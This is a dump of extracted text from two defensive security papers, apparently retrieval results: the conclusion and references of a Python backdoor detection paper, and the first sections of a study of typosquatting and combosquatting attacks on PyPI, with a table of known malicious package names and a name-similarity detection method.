0.9623 0.9503 0.9866 0.9563\\nSecurity and Communication Networks 11\\n 2037, 2021, 1, Downloaded from https://onlinelibrary.wiley.com/doi/10.1155/2021/9923234 by Morocco Hinari NPL, Wiley Online Library on [25/03/2025]. See the Terms and Conditions (https://onlinelibrary.wiley.com/terms-and-conditions) on Wiley Online Library for rules of use; OA articles are governed by the applicable Creative Commons License\\nshould not be too small. Cui’s [18] method is similar to the\\nvalue n � 1, and Fang et al.’s [22] method isn � 4, neither of\\nwhich can eﬀectively represent the code semantic infor-\\nmation. 'erefore, the value ofn in this paper is reasonable\\nand eﬀective for classiﬁcation.\\nIn summary, compared with previous research, PBDT\\ncan better identify malicious Python backdoor.\\n5. Conclusion\\nInordertoensuretheconcealmentofbackdoor,theattacker\\nwill obfuscate and encode the code. Concurrently, the parts\\nof the text that are not related to the function will also aﬀect\\nthe detection eﬀect. But the encoding often has apparent\\ncharacteristics,andtheinterferenceitemssuchascomments\\nwill not be compiled. 'is paper proposes and constructs a\\nPython backdoor detection model PBDT, representing the\\ntext through the statistical features caused by obfuscation\\nand the features of opcode sequence in the compilation, and\\nmatchesthesuspiciousmodulesandfunctionsinthecodeas\\nwell. 'e above features can be used for backdoor recog-\\nnition, respectively. However, experiments have proved that\\nthe detection eﬀect of comprehensive features is the best.\\nWhen using the Random Forest classiﬁer, the accuracy of\\n97.70% and the TNR of 98.66% can be obtained.\\nCompared with the dynamic detection which requires\\nhigh detection environment and the deep learning that\\nconsumes a lot of resources, the static detection scheme\\nbasedonmachinelearningproposedinthispapercanobtain\\nbetterdetectionresultswithlimitedresources.Whatismore,\\nunderthepremisethatthedatasetcontainssomeobfuscated\\nsamples, it has a signiﬁcant performance improvement\\ncomparedwiththepreviouslyproposedwebshell’sdetection\\nmethod. However, this scheme covers many aspects and has\\nan extensive feature dimension. How to obtain better de-\\ntection performance with limited feature dimensions is a\\ndirection worthy of our future research. At the same time,\\nexploring the characteristics of other programming lan-\\nguage’s backdoor scripts is also a valuable work. 'e design\\nideaofthispaperisalsoapplicabletoothermaliciousPython\\ncode detection.\\nData Availability\\n'e data used to support the ﬁndings of this study are in-\\ncluded within the article.\\nConflicts of Interest\\n'e authors declare that there are no conﬂicts of interest\\nregarding the publication of this study.\\nAcknowledgments\\n'is paper was supported in part by the National Natural\\nScience Foundation of China (U20B2045) and National Key\\nResearch and Development Program of China (Grant no.\\n2016QY13Z2302).\\nReferences\\n[1] Malwarebytes Labs, “2020 state of malware report,” 2020,\\navaible at: https://resources.malwarebytes.com/ﬁles/2020/02/\\n2020_State-of-Malwarebytes.Report.pdf.\\n[2] Y.D.Lawrence,D.LiangLee,Y.-H.Chen,andL.XiangYann,\\nLexicalanalysisforthewebshellattacks,” in Proceedings of the\\n2016 International Symposium On Computer, Consumer And\\nControl (IS3C), pp. 579–582, IEEE, Xi’an, China, July 2016.\\n[3] O. Starov, J. Dahse, S. S. Ahmad, T. Holz, and N. Nikiforakis,\\n“No honor among thieves: a large-scale analysis of malicious\\nweb shells,” inProceedings of the 25th International Confer-\\nence on World Wide Web, pp.1021–1032, Montr´eal, Canada,\\nApril 2016.\\n[4] C. Wang, H. Yang, Z. Zhao, L. Gong, and Z. Li, “'e research\\nand improvement in the detection of PHP variable webshell\\nbased oninformation entropy,”Journal of Computers,vol.28,\\npp. 62–68, 2016.\\n[5] M. Peter and B. V. W. Irwin, “Towards a PHP webshell\\ntaxonomy using deobfuscation-assisted similarity analysis,”\\nIEEE, in Proceedings of the 2015 Information Security for\\nSouth Africa (ISSA), pp. 1–8, Johannesburg, South Africa,\\nAugust 2015.\\n[6] H. Zhang, M. Liu, Z. Yue, Z. Xue, Y. Shi, and X. He, “A PHP\\nandJSP web shelldetection systemwithtext processing based\\non machine learning,” inProceedings of the 2020 IEEE 19th\\nInternational Conference on Trust, Security and Privacy in\\nComputing and Communications (TrustCom), pp.1584–1591,\\nIEEE, Guangzhou, China, January 2020.\\n[7] Z. Zhang, M. Li, L. Zhu, and X. Li, “Smartdetect: a smart\\ndetection scheme for malicious web shell codes via ensemble\\nlearning,” in Proceedings of the International Conference on\\nSmart Computing and Communication, Tokyo, Japan, De-\\ncember 2018.\\n[8] Z. Zhao, Q. Liu, T. Song, Z. Wang, and X. Wu, “WSLD:\\ndetecting unknown webshell using fuzzy matching and deep\\nlearning,” inProceedings of the International Conference on\\nInformation and Communications Security, pp. 725–745,\\nSpringer, Beijing, China, December 2019.\\n[9] D. Canali and D. Balzarotti, “Behind the scenes of online\\nattacks: an analysis of exploitation behaviors on the web,” in\\nProceedings of the 20th Annual Network & Distributed System\\nSecurity Symposium (NDSS 2013), San Diego, CA, USA,\\nFebruary 2013.\\n[10] M. Xie and J. Hu, “Evaluating host-based anomaly detection\\nsystems: a preliminary analysis of adfa-ld,” inProceedings of\\nthe 2013 6th International Congress on Image and Signal\\nProcessing (CISP), vol. 3, pp. 1711–1716, IEEE, Hangzhou,\\nChina, December 2013.\\n[11] Z.-H. Lv, H.-B. Yan, and R. Mei, “Automatic and accurate\\ndetection of webshell based on convolutional neural net-\\nwork,” in Proceedings of the China Cyber Security Annual\\nConference, pp. 73–85, Springer, Beijing, China, August 2018.\\n[12] Y. Tian, J. Wang, Z. Zhou, and S. Zhou, “CNN-webshell:\\nmalicious web shell detection with convolutional neural\\nnetwork,” inProceedings of the 2017 6th International Con-\\nference on Network, Communication and Computing,\\npp. 75–79, Kunming, China, December 2017.\\n[13] Z. Wang, J. Yang, M. Dai, R. Xu, and X. Liang, “A method of\\ndetecting webshell based on multi-layer perception,” Aca-\\ndemic Journal of Computing & Information Science,vol.2,p.1,\\n2019.\\n[14] B. Yong,X. Liu, Y. Liu, H. Yin, L. Huang, andQ. Zhou, “Web\\nbehavior detection based on deep neural network,” in\\n12 Security and Communication Networks\\n 2037, 2021, 1, Downloaded from https://onlinelibrary.wiley.com/doi/10.1155/2021/9923234 by Morocco Hinari NPL, Wiley Online Library on [25/03/2025]. See the Terms and Conditions (https://onlinelibrary.wiley.com/terms-and-conditions) on Wiley Online Library for rules of use; OA articles are governed by the applicable Creative Commons License\\nProceedings of the 2018 IEEE SmartWorld, Ubiquitous Intel-\\nligence & Computing, Advanced & Trusted Computing,\\nScalable Computing & Communications, Cloud & Big Data\\nComputing, Internet of People and Smart City Innovation\\n(SmartWorld/SCALCOM/UIC/ATC/CBDCom/IOP/SCI),\\npp. 1911–1916, IEEE, Guangzhou, China, October 2018.\\n[15] S. L. 'omas and A. Francillon, “Backdoors: deﬁnition, de-\\nniability and detection,” inProceedings of the 25th Interna-\\ntional Symposium on Research in Attacks, Intrusions, and\\nDefenses, pp. 92–113, Springer, Heraklion, Greece, September\\n2018.\\n[16] B. Scott and B. Hagen, “Web shell detection using NeoPI,”\\n2011, https://resources.infosecinstitute.com/topic/web-shell-\\ndetection/.\\n[17] A. Fass, M. Backes, and B. Stock, “JStap: a static pre-ﬁlter for\\nmalicious javascript detection,” in Proceedings of the 35th\\nAnnual Computer Security Applications Conference, pp. 257–\\n269, San Juan, PR, USA, December 2019.\\n[18] H.Cui,“Webshelldetectionbasedonrandomforest–gradient\\nboosting decision tree algorithm,” inProceedings of the IEEE\\n3rd International Conference on Data Science in Cyberspace\\n(DSC), June 2018.\\n[19] J.Wang,Y. Xue,Y.Liu,andH.Tian,“Jsdc:ahybridapproach\\nfor javascript malware detection and classiﬁcation,” inPro-\\nceedings of the 10th ACM Symposium on Information,\\nComputer and Communications Security, pp. 109–120, Sin-\\ngapore, April 2015.\\n[20] T. D. Tu, G. Cheng, X. Guo, and W. Pan, “Webshell detection\\ntechniques in web applications,” in Proceedings of the 5th\\nInternational Conference on Computing, Communications and\\nNetworking Technologies (ICCCNT), pp. 1–7, IEEE, Hefei,\\nChina, July 2014.\\n[21] I. A. Al-Taharwa, H.-M. Lee, A. Jeng, K. Wu, C. Ho, and\\nS.Chen,“JSOD:javascriptobfuscationdetector,” Security and\\nCommunication Networks, vol. 8, no. 6, pp. 1092–1107, 2015.\\n[22] Y. Fang, Y. Qiu, L. Liu, and C. Huang, “Detecting webshell\\nbased on random forest with fasttext,” inProceedings of the\\n2018 International Conference on Computing and Artiﬁcial\\nIntelligence, pp. 52–56, Chengdu China, March 2018.\\n[23] Z. Pan, Y. Chen, Y. Chen, Y. Shen, and X. Guo, “Webshell\\ndetection based on executable data characteristics of PHP\\ncode,”Wireless communications and mobile computing,\\nvol. 2021, Article ID 5533963, 12 pages, 2021.\\n[24] Y.Wu,Y.Ma,andS.Wan,“Multi-scalerelationreasoningfor\\nmulti-modal visual question answering,” Signal Processing:\\nImage Communication, vol. 96, Article ID 116319, 2021.\\n[25] S. Ding, S. Qu, Y. Xi, and S. Wan, “Stimulus-driven and\\nconcept-driven analysis for image caption generation,”\\nNeurocomputing, vol. 398, pp. 520–530, 2020.\\n[26] S. Ndichu, S. Ozawa, T. Misu, and K. Okada, “A machine\\nlearning approach to malicious JavaScript detection using\\nﬁxed length vector representation,” inProceedings of the 2018\\nInternational Joint Conference on Neural Networks (IJCNN),\\npp. 1–8, IEEE, Rio de Janeiro, Brazil, July 2018.\\n[27] H. C. Kim, Y. H. Choi and H. L. Dong, JsSandbox: a\\nframework for analyzing the behavior of malicious JavaScript\\ncode using internal function hooking,”KSII Transactions on\\nInternet & Information Systems, vol. 6, p. 2, 2012.\\n[28] K.Rieck,T.Krueger,andA.Dewald,“Cujo:eﬃcientdetection\\nand preventionof drive-by-download attacks,” inProceedings\\nof the 26th Annual Computer Security Applications Confer-\\nence, pp. 31–39, Austin, TX, USA, December 2010.\\n[29] A. Fass, M. Backes, and B. Stock, “Hidenoseek: camouﬂaging\\nmaliciousjavascriptinbenignasts,”in Proceedings of the 2019\\nACM SIGSAC Conference on Computer and Communications\\nSecurity, pp. 1899–1913, London, UK, November 2019.\\n[30] A. Fass, R. P. Krawczyk, M. Backes, and B. Stock, “JaSt: fully\\nsyntactic detection of malicious (obfuscated) javascript,” in\\nProceedings of the International Conference on Detection of\\nIntrusions and Malware, and Vulnerability Assessment,\\npp. 303–325, Springer, Saclay, France, June 2018.\\n[31] A. Kapravelos, S. Yan, M. Cova, C. Kruegel, and G. Vigna,\\n“Revolver: an automated approach to the detection of evasive\\nweb-based malware,” in Proceedings of the 22nd USENIX\\nSecurity Symposium (USENIX Security, vol. 13, pp. 637–652,\\nWashington, DC, USA, August 2013.\\n[32] L.Yu,J.Huang,I.Ademola,M.Mitchell,J.Zhang,andR.Dai,\\n“Shellbreaker: automatically detecting PHP-based malicious\\nweb shells,”Computers & Security, vol. 87, Article ID 101595,\\n2019.\\n[33] Z.Li,A.Qi,C.Xiong,Y.Chen,T.Zhu,andH.Yang,“Eﬀective\\nand light-weight deobfuscation and semantic-aware attack\\ndetection for powershell scripts,” inProceedings of the 2019\\nACM SIGSAC Conference on Computer and Communications\\nSecurity, pp. 1831–1847, London, UK, November 2019.\\n[34] C. E. Shannon, “A mathematical theory of communication,”\\n1e Bell System Technical Journal, vol. 27, no. 3, pp. 379–423,\\n1948.\\n[35] J. Ramos, “Using tf-idf to determine word relevance in\\ndocument queries,” in Proceedings of the 1st Instructional\\nConference On Machine Learning, vol. 242, pp.133–142, New\\nJersey, NJ, USA, August 2003.\\n[36] J. Armand, E. Grave, P. Bojanowski, and T. Mikolov, “Bag of\\ntricks for eﬃcient text classiﬁcation,” 2016, https://arxiv.org/\\nabs/1607.01759.\\n[37] T.K.Ho,“Randomdecisionforests,”in Proceedings of the 3rd\\ninternational conference on document analysis and recogni-\\ntion, vol. 1, pp. 278–282, Montreal, Canada, August 1995.\\n[38] Y. Guo, H. Marco-Gisbert, and K. Paul, “Mitigating webshell\\nattacks through machine learning techniques,” Future In-\\nternet, vol. 12, p. 1, 2020.\\nSecurity and Communication Networks 13\\n 2037, 2021, 1, Downloaded from https://onlinelibrary.wiley.com/doi/10.1155/2021/9923234 by Morocco Hinari NPL, Wiley Online Library on [25/03/2025]. See the Terms and Conditions (https://onlinelibrary.wiley.com/terms-and-conditions) on Wiley Online Library for rules of use; OA articles are governed by the applicable Creative Commons License\\n\"} score: 0.15708069798089888\n",
      "{'metadata': {'/IEEE Issue ID': '9229648', '/Producer': 'OpenPDF 1.0.0-SNAPSHOT; modified using iText® 7.1.1 ©2000-2018 iText Group NV (AGPL-version)', '/IEEE Article ID': '9229803', '/Title': 'Typosquatting and Combosquatting Attacks on the Python Ecosystem', '/IEEE Publication ID': '9229477', '/Meeting Ending Date': '11 Sept. 2020', '/Meeting Starting Date': '7 Sept. 2020', '/Subject': '2020 IEEE European Symposium on Security and Privacy Workshops (EuroS&PW);2020; ; ;10.1109/EuroSPW51379.2020.00074', '/ModDate': \"D:20201020162348-04'00'\", '/CreationDate': 'D:20201014200339Z'}, 'data': 'Typosquatting and Combosquatting Attacks on the\\nPython Ecosystem\\nDuc-Ly Vu, Ivan Pashchenko, Fabio Massacci\\nUniversity of Trento, Italy\\n{ducly.vu, ivan.pashchenko, fabio.massacci}@unitn.it\\nHenrik Plate, Antonino Sabetta\\nSAP Security Research, France\\n{henrik.plate, antonino.sabetta}@sap.com\\nAbstract—Limited automated controls integrated into the\\nPython Package Index (PyPI) package uploading process make\\nPyPI an attractive target for attackers to trick developers into\\nusing malicious packages. Several times this goal has been\\nachieved via the combosquatting and typosquatting attacks when\\nattackers give malicious packages similar names to already exist-\\ning legitimate ones. In this paper , we study the attacks, identify\\npotential attack targets, and propose an approach to identify\\ncombosquatting and typosquatting package names automatically.\\nThe approach might serve as a basis for an automated system that\\nensures the security of the packages uploaded and distributed via\\nPyPI.\\nIndex T erms—FOSS, Malicious Software, Supply Chain At-\\ntacks, Combosquatting, Typosquatting, Python, PyPI\\nI. I NTRODUCTION\\nPython Package Index (PyPI) provides a comfortable and\\nwidely used way to distribute Python projects users. However,\\nthis ease of use comes at a cost: PyPI has been leveraged to\\nspread malware [1]. For example, the Slovak National Security\\nOfﬁce1 reported 10 cases where malicious code was embedded\\ninto the installation script to steal users’ data. Perica [2]\\nshowed that many packages in PyPI contain executables that\\nmay include malicious payload triggered by users.\\nLimited automated controls integrated into the PyPI pack-\\nage publishing system and a small number of administrators\\nprevents the security veriﬁcation of every package. Hence,\\nattackers can repackage the others package code into a new\\npackage with a malicious payload, and trick users into in-\\nstalling it. Several studies demonstrated PyPI vulnerability to\\nthe squatting attacks.\\nTo demonstrate the ability to register typosquatting packages\\nTschacher [1] uploaded artiﬁcial packages with the names\\nnearly identical to the legitimate packages, to the three dif-\\nferent software repositories (including PyPI), and received\\n45K downloads over several months. Stagg [3] crafted and\\nuploaded 12 packages that have names of the modules of\\nPython standard library (e.g., os, csv) and observed a\\nmassive number of downloads of these packages (>490K\\ndownloads per year). Hence, squatting package names could\\nbe an attractive way to introduce malicious packages in PyPI.\\nConsidering the ever-growing popularity of PyPI, there is\\na signiﬁcant need for controls capable to automatically ﬁnd\\nmalicious packages hosted in PyPI and prevent attackers from\\n1https://www.nbu.gov.sk/skcsirt-sa-20170909-pypi/\\nuploading new malicious packages. Hence, in this paper, we\\nprovide the following contributions:\\n• a study of the common attacks to craft malicious packages\\nand trick users into downloading them,\\n• an approach for automatic identiﬁcation of packages\\nlikely used in combosquatting and typosquatting attacks.\\nFollowing the motivating study of Stagg [3], we checked\\nwhether any PyPI packages have the same name as any of\\nthe 297 module names of the Python standard library.2 We\\nidentiﬁed 62 such packages. Our manual analysis of these\\npackages suggested that they are kept in PyPI mostly for\\nbackporting reasons.3\\nTable I shows that attackers apply different modiﬁcations\\nto package names, however, these names remain similar to\\nthe original packages. Therefore, we use the Levenshtein\\ndistance [4] as the simplest and widely used technique to\\ncalculate the edit distance between package name strings. Our\\nempirical results suggest that 79 933 packages are safe to use,\\nand 67 005 packages require to be further investigated.\\nII. H OW PYPI WORKS\\nPyPI is a popular repository of Python applications or\\npackages: as of February 2020, it contains more than 216K\\npackages with the total number of downloads exceeding four\\nbillion times. PyPI is maintained by a group of developers\\ncalled Python Packaging Authority (PyP A for short). Figure 1\\nprovides an overview of different roles envisioned by PyPI:\\nEnd Users, Package Owners, PyPI Moderators (PyP A), and\\nPyPI Administrators (PyP A).\\nEnd Users provide the name of a package to a package\\nmanager tool, like pip5 to install the package from PyPI.\\nAlthough pip does everything automatically for installing a\\npackage, it neither requires user authentication nor performs\\nany validation of the package. Instead,pip merely looks for\\nthe package in PyPI by its name, identiﬁes and resolves its\\ndependencies, downloads all the required components, and\\ninstalls them on the End User’s computer.\\n2We checked against all modules appeared in at least one of the existing\\nPython standard libraries: Python 2.6, 2.7, 3.2, 3.3, 3.4, 3.5, 3.6, 3.7, and 3.8.\\n3The manual analysis of 62 packages available at https://github.com/\\nvuduclyunitn/wacco_2020\\n4Data collected from pypistats.com on Feb 15, 2020\\n5https://pip.pypa.io/en/stable/\\n509\\n2020 IEEE European Symposium on Security and Privacy Workshops (EuroS&PW)\\n© 2020, Duc Ly Vu. Under license to IEEE.\\nDOI 10.1109/EuroSPW51379.2020.00074\\nAuthorized licensed use limited to: Oracle. Downloaded on March 25,2025 at 09:11:16 UTC from IEEE Xplore.  Restrictions apply. Package Owners (400K)\\n End users\\nAdministrators\\nless than 10 people\\n30TB/day\\nNurse\\nModerators\\nUpload project\\nMaintain project Install project\\nBan project\\nRemove package\\nFig. 1: Roles and responsibilities in the PyPI ecosystem.4\\nPackage Owners can distribute code on PyPI using the tool\\ncalled setuptools6 that packs the original source code and\\ngenerates a local distribution that is either in a source7 or built8\\nformat. Package Owners register a package name on PyPI and\\npublish the distribution artifacts of the package. If Package\\nOwners have provided both distribution types,pip prefers to\\ninstall the built distribution ﬁrst. Publishing a package on PyPI\\nis restricted to Package Owers, who can later modify (e.g.,\\nupdate a new version) existing packages that they have access.\\nPyPI Administrators and Moderators have exclusive rights\\nto ban or revoke packages of Package Owners. For example, if\\na particular package is reported as malware, the Administrators\\nwill delete the package from PyPI and block the malicious de-\\nveloper. The Administrators can delete the corrupted package\\nand support the Package Owners in recovering their access if\\na package owner credentials are compromised or damaged.\\nAlthough this scheme proved to support high latency for\\nboth Package Owners and End Users, limited resources and\\nautomated controls integrated into the package uploading, and\\ndistribution process leave the room for attackers to use PyPI\\nfor spreading malicious software. PyPI especially becomes an\\nattractive target for attackers, considering the certain unbal-\\nance concerning the number of Package Owners and PyP A\\ndevelopers (40K to 1) and continuously growing popularity\\nof PyPI. In the next sections, we will give an overview of\\nthe common strategies that attackers use to craft malicious\\npackages and exploit the PyPI package distribution procedure\\nto deliver malicious packages to End Users (Section III).\\nIII. C RAFTING AND SHIPPING MALICIOUS P ACKAGES\\nIn the wild, attackers use mostly two ways to spread\\nmalicious code within the PyPI ecosystem:\\n• steal the legitimate package owner’s credentials of an\\nexisting package, inject a malicious payload into it so\\nthat users in their normal activities can unintentionally\\ndownload it (e.g., install or update a package);\\n• create a new package with built-in malicious payload and\\ntrick users into downloading it (e.g., by squatting the\\nname of a popular package).\\nStealing PyPI credentials. In the ﬁrst approach, attackers\\nexploit End Users’ trust in an already existing package. After\\n6https://github.com/pypa/setuptools\\n7https://packaging.python.org/glossary/#term-source-distribution-or-sdist\\n8https://packaging.python.org/glossary/#term-built-distribution\\nthe attacker obtained the Package Owner’s rights to perform\\nspeciﬁc operations in the publishing process, they can upload\\ntheir crafted package as a new (malicious) version of a com-\\npromised package. The ssh-decoratepackage (Table I)\\nwas affected by such an attack when attackers injected a\\nmalicious functionality for sending users’ SSH credentials to a\\nremote server.9 Although this attack requires additional effort\\n(e.g., social engineering) to obtain the credentials of package\\nowners, a certain number of infections are still possible.\\nTricking users into downloading malicious packages.In\\nthe second approach, attackers create a new package that, by\\ndesign, features some malicious behavior. Attackers can craft\\nthe package from scratch or fork an existing PyPI package. In\\nthe latter case, the attackers injected a malicious dependency\\nby modifying thesetup.py installation script of the package so\\nthat the malicious dependency will be downloaded and silently\\ninstalled along with the benign package (e.g.,acqusition\\n(#11), urlib3 (#8) attacks in Table I). Then, they follow a\\nregular procedure to create an account in PyPI, register a new\\npackage name, and upload the malicious package.\\nTo increase the chance of getting more infections, attackers\\nregister package names that are similar to existing (usually\\npopular) packages by package typosquatting or package\\ncombosquatting([5],[6]) in which they split the package name\\ninto elements based on the \"hyphen\" character, and rearrange\\nthe elements, e.g., \"python-nmap\" into \"nmap-python\". Users\\nwho mistype or confuse the package name will install the\\nmalicious package instead of the legitimate one.\\nGiven a large number of package owners w.r.t. the number\\nof administrators, this likely to be (and so far has been)\\nundetected because several legitimate packages whose names\\nvery close to other legitimate packages. For example, there is a\\nPyPI package calledcpythonthat has the same name as the\\nGithub project “cpython”.10 The package, however, has a very\\nvague description and uses a different source code repository.\\nTable I shows several past combosquatting and typosquat-\\nting attacks in PyPI. Lutoma11 detected two malicious pack-\\nages; one substituted the ‘l’ character with the capital ‘I’ so\\nthat it is quite tricky to distinguish between jeIlyfish\\nand jellyfish. At the time of its detection, the package\\nhad been downloaded 119 times. Another malicious package\\nexploited the difference between the package naming practices\\nestablished in two python versions Python 2 and Python 3\\n(python3-dateutilvs. python-dateutil) to con-\\nfuse users when selecting the package of a particular Python\\nversion. These packages were used to steal users’ information\\nand send them to a remote server. Attackers prefer to delete\\ncharacters from the legitimate packages to generate squatting\\nnames. For example, the Slovak National Security identiﬁed\\nten PyPI packages12 (e.g., acqusition, urllib) that sent\\n9https://medium.com/@bertusk/cryptocurrency-clipboard-hijacker-\\ndiscovered-in-pypi-repository-b66b8a534a8\\n10“cpython” is a compiler or an interpreter, not a third-party package\\n11https://github.com/dateutil/dateutil/issues/984\\n12https://www.nbu.gov.sk/skcsirt-sa-20170909-pypi/\\n510\\nAuthorized licensed use limited to: Oracle. Downloaded on March 25,2025 at 09:11:16 UTC from IEEE Xplore.  Restrictions apply. T ABLE I: Malicious packages in our sample. Levenshtein distanced\\n# Time Appear Malicious Package Legitimate package Names change d=1 d=2\\n1 2016-03-02 virtualnv virtualenv Delete ‘e’ ✓\\n2 2016-03-03 mumpy numpy Substitute ‘n’ by ‘m’ ✓\\n3 2017-05-01 crypt crypto Delete ‘o’ ✓\\n4 2017-06-02 django-server django-server-guardian-api Delete “-guardian-api”\\n5 2017-06-02 pwd pwdhash.py Delete “hash.py”\\n6 2017-06-02 setuptool setuptools Delete ‘s’ ✓\\n7 2017-06-02 setup-tools setuptools Insert ‘-’ ✓\\n8 2017-06-02 telnet telnetsrvlib Delete “srvlib”\\n9 2017-06-02 urlib3 urllib3 Delete ‘l’ ✓\\n10 2017-06-02 urllib urllib3 Delete ‘3’ ✓\\n11 2017-06-03 acqusition acquisition Delete ‘i’ ✓\\n12 2017-06-03 apidev-coop apidev-coop_cms Delete “_cms”\\n13 2017-06-04 bzip bz2ﬁle Substitute “2ﬁle” by “ip”\\n14 2017-11-23 djanga django Substitute ‘a’ by ‘o’ ✓\\n15 2017-11-24 easyinstall easy_install Delete ‘_’ ✓\\n16 2017-12-05 colourama colorama Delete ‘u’ ✓\\n17 2018-04-25 openvc opencv-python Swap ‘c’ and ‘v’ & Delete “-python”\\n18 2018-05-02 mateplotlib matplotlib Insert ‘e’ ✓\\n19 2018-05-02 numipy numpy Insert ‘i’ ✓\\n20 2018-05-02 python-mysql MySQL-python Swap “python” and “mysql” ✓\\n21 2018-05-03 libcurl pycurl Substitute “py” by “lib”\\n22 2018-05-03 libhtml5 html5lib Swap “html5” and “lib”\\n23 2018-05-03 pysprak pyspark Swap ‘a’ and ‘r’ ✓\\n24 2018-05-03 PyYMAL pyyaml Swap ‘a’ and ‘m’ ✓\\n25 2018-05-10 nmap-python python-nmap Swap “nmap” and “python” ✓\\n26 2018-05-10 python-mongo pymongodb Delete “db” & Substitute “py” by “python-”\\n27 2018-05-10 python-openssl openssl-python Swap “openssl” and “python” ✓\\n28 2018-09-17 pytz3-dev pytz Insert “3-dev”\\n29 2018-10-29 python-sqlite pysqlite Substitute “py” by “python-”\\n30 2018-10-30 python-ftp pyftpdlib Delete “dlib” & Substitute “py” by “python-”\\n31 2018-10-30 python-mysqldb MySQL-python Swap “python” and “mysql” & Insert “db”\\n32 2018-10-30 smb pysmb Delete “py” ✓\\n33 2018-10-31 pythonkafka kafka-python Swap “kafka” and “python” & Delete ‘-’\\n34 2019-12-01 jeIlyﬁsh jellyﬁsh Substitute ‘l’ by ‘I’ ✓\\n35 2019-12-01 python3-dateutil python-dateutil Insert ‘3’ ✓\\n36 2018-04-25 ssh-decorate ssh-decorate Hijacked Package\\nsensitive information to a remote server, nine of the packages\\nwere created by deleting characters from original packages.\\nSeveral combosquatting packages were distributed by ex-\\nploiting the usage of common preﬁxes or sufﬁxes within\\nPyPI packages (see the analysis in Section V), e.g., pytz\\ninto pytz3-dev making the malicious package look like\\nthe distribution of a Python 3 development version of the\\noriginal package. Similarly, attackers used a singular form\\nof a package name instead of a plural one ( setuptool\\ninstead of setuptools), add special characters (e.g.,\\nhyphens or underscores), somewhere in a package name\\n(setup-toolsinstead ofsetuptools, easy_install\\ninstead ofeasyinstall), or create a similar package name\\na commonly known tool or a module of the standard library\\n(e.g., pwd13). Attackers leveraged the difference in spellings\\nof UK and US languages: malicious packagecolourama, re-\\nsembling the benign packagecolorama, download a crypto\\nminer upon installation by victims.14\\nIV . TELLING MALICIOUS PACKAGES APA RT\\nWe start by describing our collection of the ground-truth\\npackages. They are the ones whose characteristics of a le-\\ngitimate package. Then we proceed to identify suspicious\\n13There exist similar Linux commands.\\n14https://medium.com/@bertusk/cryptocurrency-clipboard-hijacker-\\ndiscovered-in-pypi-repository-b66b8a534a8\\npackages whose names that are the same or similar to the\\nground-truth packages.\\nAssumptions: Our ground-truth packages consist of two\\ntrusted sources:\\n1) Modules of the Python standard library15 (e.g., os, csv,\\nre) that are bundled into Python distributions.\\n2) PyPI packages with known source code repositories.\\nSimilar to [3], we assume that a PyPI package should not\\nuse the name of a module of the Python standard library. If a\\npackage in PyPI has an exact or nearly identical name to one\\nof these modules, we mark such a package as suspicious.\\nWe assume that a PyPI package’s legitimacy could be\\nveriﬁed by checking its source code repository that provides\\nadditional metrics (e.g., number of stars, followers, and forks)\\noften used by developers to reason about the package repu-\\ntation and community support [7]. Considering the examples\\nof Table I, we observe that developers tend to use the same\\npackage name as the repository name in Github. Although\\nthere is no strict requirement on the name correspondence, we\\nbase on this observation to identify the list of packages with\\nknown code repositories as ground-truth:\\n• PyPI packages whose names are the same as the reposi-\\ntory names in Github are not typosquatting packages,\\n15https://docs.python.org/3/library/\\n511\\nAuthorized licensed use limited to: Oracle. Downloaded on March 25,2025 at 09:11:16 UTC from IEEE Xplore.  Restrictions apply. • PyPI packages whose names are different than the repos-\\nitory names or do not have any reference to a Github\\nrepository, require additional veriﬁcation (Section VI).\\nAlgorithm: To measure the similarity of package names, we\\ncalculate the Levenshtein distance [4] between each pair of\\npackages and check if the distance is less than or equal to a\\nthreshold heuristically. Based on the list of previous typosquat-\\nting package names in Table I, we deﬁne the threshold for the\\npackage name similarity to be equal to two as it allows us\\nto identify the majority of known attacks (21 out of 36) and\\nreduce the number of false positives.\\nFigure 2 summarizes the proposed idea for detection of\\nsquatting packages. Packages where source appears in a repos-\\nitory (e.g., Github) can be veriﬁed either by checking their\\nreputation (e.g., number of stars) or source code. We assume\\nthat the packages that do not have source code repositories\\nor share the same repository while having a different name\\nat the same time with another are suspicious. We note that it\\nis not required that a legitimate package name in PyPI is the\\nsame as the repository name in Github or other version control\\nsystems.\\nPyPI\\n• urllib3\\n• tensorﬂow\\n• pandas\\n..\\nSelect apackage\\nDoes thepackage have\\nthe same nameas a module ofstandard libs?\\nDoes thepackage have\\nthe namesimilar to amodule ofstandard libs?\\nDoes thepackage\\nhave thesamerepository\\nname?\\nDoes thepackage\\nhave thenamesimilar to apackage\\nwith knownsource?\\nManualinspection\\nNo\\nNo Yes\\nYe s\\nYe s\\nFig. 2: Detecting Suspicious Squatting Packages.16\\nStep 1: Processing of modules of Python standard library\\nTo compose a list of module names of the Python standard\\nlibrary, we base on thestdlib-list17 package to collect\\nPython standard library module names of the Python standard\\nlibrary from nine different Python versions. Then, we scan the\\nwhole PyPI and report packages whose names are the same\\nas any module of Python standard library as suspicious.\\nStep 2: Processing of PyPI packages with known source\\ncode repositoriesFor those PyPI packages whose URLs lead\\nto Github repositories, we use the URLs to extract the source\\ncdoe repository names. After comparing the repository and\\npackage name, we classify packages that have the same name\\nas not created for a typosquatting attack and all other packages\\nas required to pass through additional veriﬁcation.\\nStep 3: Identiﬁcation of packages possibly created for\\nsquatting attacksWe look for packages whose names have\\n16To simplify the algorithm, unspeciﬁed paths all lead to the legitimate\\npackages which are not required inspection.\\n17https://pypi.org/project/stdlib-list/\\nT ABLE II: Descriptive statistics of package name lengths.\\ncount mean std min 25% 50% 75% max\\npackage 216 547 12.4 7.4 1 7 10 16 80\\nthe Levenshtein distance less or equal than two to the module\\nnames of Python standard library and the packages whose\\nthe same names as code repositories (Step 2). To capture\\nthe common preﬁx “python” added during the combosquatting\\nattack, we preprocess package names by substituting “python”\\nwith ‘*’. This transformation allows us to capture, e.g., attacks\\n#20, #25-27, #29-31, and #33 in Table I.\\nV. EMPIRICAL RESUL TS\\nDescriptive statistics:In total, we analyzed 216 548 pack-\\nages from PyPI as of February 20, 2020. On average, a\\npackage name has 12 characters, while lengths of names of\\n50% of packages are shorter or equal to ten characters. Table II\\nshows descriptive statistics of package name lengths in PyPI.\\nWe identiﬁed 165 878 packages have homepage URLs, and\\n197 packages provide code page URLs.18 The largest share of\\nPyPI packages use Github as a place to store their source\\ncode: 141 358 homepage URLs (85%) and 196 codepage\\nURLs (99%). Other packages host their source code on GitLab\\n(2792 homepage URLs and 10 codepage URLs), BitBucket\\n(4606 homepage URLs and three code page URLs), Google\\ncode (847 homepage URLs), and SourceForge (618 homepage\\nURLs). 3550 packages (13.3%) either do not 